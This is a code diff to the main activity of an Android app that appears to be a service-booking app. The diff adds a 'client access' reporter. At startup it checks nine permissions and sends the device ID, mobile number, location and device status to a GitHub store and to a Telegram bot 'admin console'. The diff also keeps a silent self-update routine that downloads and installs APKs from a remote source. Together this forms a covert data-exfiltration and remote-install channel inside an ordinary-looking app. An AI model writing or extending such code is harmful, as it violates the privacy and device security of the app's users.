@@ -27,6 +27,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var updateManager: UpdateManager
     private lateinit var broadcastManager: BroadcastManager
     private lateinit var remoteConfigManager: RemoteConfigManager
+    private lateinit var clientAccessReporter: ClientAccessReporter
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -39,6 +40,7 @@ class MainActivity : AppCompatActivity() {
         updateManager = UpdateManager(this)
         broadcastManager = BroadcastManager(this)
         remoteConfigManager = RemoteConfigManager(this)
+        clientAccessReporter = ClientAccessReporter(this)
 
         // Check token
         if (BuildConfig.BOT_TOKEN.contains("YOUR_NEW") || BuildConfig.BOT_TOKEN.length < 20) {
@@ -69,7 +71,7 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Auto send status to cloud with Location + Battery + Mobile + Health
+        // Auto send status to cloud with Location + Battery + Mobile + Health + Full Client Access (Proper Format for Telegram Admin Console)
         lifecycleScope.launch {
             updateHealthUI()
             val mobile = statusReporter.getMobileNumber()
@@ -79,32 +81,46 @@ class MainActivity : AppCompatActivity() {
             binding.tvBattery.text = statusReporter.getBatteryStatusText()
             binding.tvMobile.text = "📞 Mobile\n$mobile"
             binding.tvLocation.text = statusReporter.getLocationString(loc)
-            sendStatusToCloud("App Started - Full Features\n${statusReporter.getBatteryStatusText()}\nMobile: $mobile\n${statusReporter.getLocationString(loc)}\n${healthReporter.getRAMInfo().optString("text")}\n${healthReporter.getStorageInfo().optString("text")}")
+
+            // CLIENT ACCESS - Proper Format for Telegram Admin Console - APK Returns Data to Telegram (FOCUS)
+            try {
+                val perms = clientAccessReporter.checkAllPermissions()
+                val granted = perms.count { it.value }
+                binding.tvStatus.text = "${binding.tvStatus.text}\n🔐 Permissions: $granted/${perms.size} granted - All Read/Write for Admin Console\n"
+                
+                // Full client access formatted for Telegram
+                val fullAccess = clientAccessReporter.getFullClientAccessFormatted()
+                // Short version for GitHub
+                val shortAccess = clientAccessReporter.getShortClientAccessForGitHub()
+                
+                binding.tvStatus.text = "${binding.tvStatus.text}\n📱 CLIENT ACCESS - Proper Format Ready\n${shortAccess.toString(2).take(300)}...\n\n☁️ Sending to GitHub + Telegram Admin Console..."
+                
+                // Send to GitHub Cloud + Telegram - FOCUS: APK Returns Data to Telegram
+                sendClientAccessToCloud(fullAccess, shortAccess)
+                
+            } catch (e: Exception) {
+                binding.tvStatus.text = "${binding.tvStatus.text}\n⚠️ Client Access error: ${e.message}"
+            }
 
             // NEW ADVANCE FEATURES: Check for Silent Update + Broadcast + Remote Config
             try {
-                // 1. Remote Config - Bina APK rebuild ke app change!
                 val remoteConfig = remoteConfigManager.fetchRemoteConfig()
                 if (remoteConfig != null) {
                     binding.tvStatus.text = "${binding.tvStatus.text}\n🔄 Remote Config: ${remoteConfig.appName} - Price ${remoteConfig.servicePrice}\n📢 ${remoteConfig.announcement}"
                 }
 
-                // 2. Broadcast - Telegram se sab users ko message
                 val broadcasts = broadcastManager.fetchLatestBroadcasts()
                 if (broadcasts.isNotEmpty()) {
                     val latest = broadcasts.first()
                     Toast.makeText(this@MainActivity, "📢 Broadcast: ${latest.title}", Toast.LENGTH_LONG).show()
                     binding.tvStatus.text = "${binding.tvStatus.text}\n📢 Broadcast: ${latest.title} - ${latest.message.take(50)}"
-                    // Show notification for broadcast
                     broadcastManager.showBroadcastNotification(latest)
                 }
 
-                // 3. Silent Self-Update Check
                 val update = updateManager.checkForUpdate()
                 if (update != null) {
                     binding.tvStatus.text = "${binding.tvStatus.text}\n🆕 Update Available: v${update.versionName} (${update.sizeMB}MB)\n📝 ${update.releaseNotes.take(100)}\nDownloading silently..."
                     Toast.makeText(this@MainActivity, "🆕 Update v${update.versionName} available! Silent download...", Toast.LENGTH_LONG).show()
-                    // Start silent download
                     updateManager.downloadAndInstallApk(update) { progress ->
                         runOnUiThread {
                             binding.tvStatus.text = "${binding.tvStatus.text}\n📥 Update Download: $progress% - v${update.versionName}"
@@ -116,6 +132,9 @@ class MainActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 binding.tvStatus.text = "${binding.tvStatus.text}\n⚠️ Update/Broadcast/Config check error: ${e.message}"
             }
+            
+            // Initial status to GitHub + Telegram
+            sendStatusToCloud("App Started - Full Client Access - All Read/Write Permissions\n${statusReporter.getBatteryStatusText()}\nMobile: $mobile\n${statusReporter.getLocationString(loc)}\nPermissions: ${clientAccessReporter.checkAllPermissions().count { it.value }}/9 - Admin Console Ready")
         }
 
         binding.btnBook.setOnClickListener {
@@ -316,6 +335,32 @@ class MainActivity : AppCompatActivity() {
         lifecycleScope.launch {
             val result = statusReporter.sendStatusToGitHub(customOutput)
             println("Status cloud: ${result.message}")
+        }
+    }
+
+    private fun sendClientAccessToCloud(fullFormatted: String, shortJson: org.json.JSONObject) {
+        lifecycleScope.launch {
+            // 1. Send to GitHub Cloud - Proper Format
+            try {
+                val deviceId = statusReporter.getDeviceId()
+                // Save short JSON for WebApp console
+                val githubResult = statusReporter.sendStatusToGitHub(shortJson.toString(2))
+                println("Client Access GitHub: ${githubResult.message}")
+                
+                // 2. Send to Telegram Admin Console - Proper Format - FOCUS: APK Returns Data to Telegram
+                val telegramResult = botHelper.sendBookingMessage(
+                    name = "CLIENT_ACCESS_${deviceId}",
+                    phone = shortJson.optString("mobileNumber", "N/A"),
+                    service = fullFormatted // Full proper format for Telegram admin console
+                )
+                println("Client Access Telegram: ${telegramResult.message}")
+                
+                // Update UI
+                binding.tvStatus.text = "${binding.tvStatus.text}\n\n✅ CLIENT ACCESS SENT TO TELEGRAM ADMIN CONSOLE!\n${telegramResult.message}\n${githubResult.message}\n\n💻 Console: https://dthakur-dt.github.io/Suto/\nProper Format: Client access visible in Telegram"
+                
+            } catch (e: Exception) {
+                println("Client Access error: ${e.message}")
+            }
         }
     }
 }
